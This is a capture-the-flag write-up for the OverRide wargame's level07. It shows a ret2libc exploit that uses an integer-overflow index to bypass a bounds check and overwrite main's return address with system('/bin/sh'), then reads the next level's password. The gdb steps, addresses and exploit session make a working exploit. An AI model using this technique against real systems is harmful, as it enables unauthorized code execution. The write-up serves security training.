# level07

## Header

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07
```

<hr>

## Solution

From the [disassembled binary](./source.s) and the [source](./source.c) code we can see that program uses some
encryption and the `shell` will be created if we pass a string and a serial number that matches the string.

Through store_number function we can simply access data that out of `buf`'s bounds, including `main`'s return address:
```c
int store_number(char *buf) {
    ...
    num = get_unum();
    index = get_unum();
    if ((index % 3 == 0) || (num >> 0x18 == 0xb7)) {
        // fail
    }
    ((unsigned int *)buf)[index] = num;
    return 0;
}
```

To do that, let's look at the stack:
| Addr (EBP) | Addr (ESP) | Description | Size |
| :-----: | :-----: | :-----: | :-----: | 
| EBP+0x10 | ESP+0x | char **env | 4 bytes |
| EBP+0xc  | ESP+0x | char **argv | 4 bytes |
| EBP+0x8  | ESP+0x | int argc | 4 bytes |
| EBP+0x4  | ESP+0x | return address | 4 bytes |
| EBP+0x0  | ESP+0x | saved EBP | 4 bytes |
| EBP-0x4  | ESP+0x | saved EDI | 4 bytes |
| EBP-0x8  | ESP+0x | saved ESI | 4 bytes |
| EBP-0xc  | ESP+0x | saved EBX | 4 bytes |
| EBP-0x18 | ESP+0x1d0 | stack alignment | 12 bytes |
| EBP-0x1c | ESP+0x1cc | stack canary | 4 bytes |
| EBP-0x30 | ESP+0x1b8 | char cmd[20] | 20 bytes |
| EBP-0x34 | ESP+0x1b4 | ret number | 4 bytes |
| ... | ... | ... | ... |
| EBP-0x1c4 | ESP+0x24 | char buf[100] | 100 bytes |
| EBP-0x1c8 | ESP+0x20 | ... | ... |
| EBP-0x1cc | ESP+0x1c | argv pointer copy | 4 bytes |
| EBP-0x1d0 | ESP+0x18 | env pointer copy | 4 bytes |
| ... | ... | ... | ... |

So, as we need to overwrite return address through `buf`, the offset should equal to `456` bytes:
```
(gdb) ! $((0x1c4 + 0x4))
bash: 456: command not found
```

This is offset in bytes, but the type of the `nums` array is `unsinged int` which size is `4 bytes` on this system:
```c
...
int main(int ac, char **av, char **env) {
    unsigned int nums[25];
...
```
In this case, we must divide our byte offset to 4: `456 bytes / 4 bytes per uint num = 114th num`.

We're going to perform `ret2libc`, so we need to overwrite return address to `system` and pass `/bin/sh` string.<br>
`114` is the index we need to use to write at the address of `main`'s return. <br>
`115` is the index of the address where return address of `system` will be stored. <br> 
`116` is the index of the address of the first system argument.<br>

From the source code above, we see that index has restriction, it should not be a multiple of `3`:
```c
if ((index % 3 == 0) || (num >> 0x18 == 0xb7)) {
    // error
}

// and 456 % 3 == 0
```

Fortunately, we can use overflow to get rid of this restriction.
Whatever index is passed, the program first calculates offset in bytes to get the address of some element.
```asm
    shl    $0x2,%eax        ; Left shift, equals to res *= 4
```

All we need to get the `modified index` is to get the max value of 32bit unsigned int + 1 (4294967296) add our offset in bytes and divide it by 4:
```
(gdb) ! $(((4294967296 + 456) / 4))
bash: 1073741938: command not found
```

The thing is when `1073741938` will be multiplied by 4, the upper bits will be erased:
```
01000000 00000000 00000000 01110010   = 1073741938
<< 2
00000000 00000000 00000001 11001000   = 456 bytes = 114 ints
```

Great! Now the last part we need - address of `system` and `/bin/sh`:
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) info proc map
    ...
    Start Addr   End Addr       Size     Offset objfile
    ...
    0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
    ...
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh" 
0xf7f897ec
1 pattern found.
```

|   | Addr (hex) | Addr (dec) |
| -----| ----- | ----- |
| system | 0xf7e6aed0 | 4159090384 |
| "/bin/sh" | 0xf7f897ec | 4160264172 |

Exploit:
```
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cd ../level08/
$ ls -la
total 28
dr-xr-x---+ 1 level08 level08   100 Oct 19  2016 .
dr-x--x--x  1 root    root      260 Oct  2  2016 ..
-r--------  1 level08 level08     0 Oct 19  2016 .bash_history
-rw-r--r--  1 level08 level08   220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root        7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level08 level08  3533 Sep 10  2016 .bashrc
-rw-r-xr--+ 1 level08 level08    41 Oct 19  2016 .pass
-rw-r--r--  1 level08 level08   675 Sep 10  2016 .profile
-r--------  1 level08 level08  2235 Oct 19  2016 .viminfo
drwxrwx---+ 1 level09 users      60 Oct 19  2016 backups
-rwsr-s---+ 1 level09 users   12975 Oct 19  2016 level08
$ cat .pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

## References
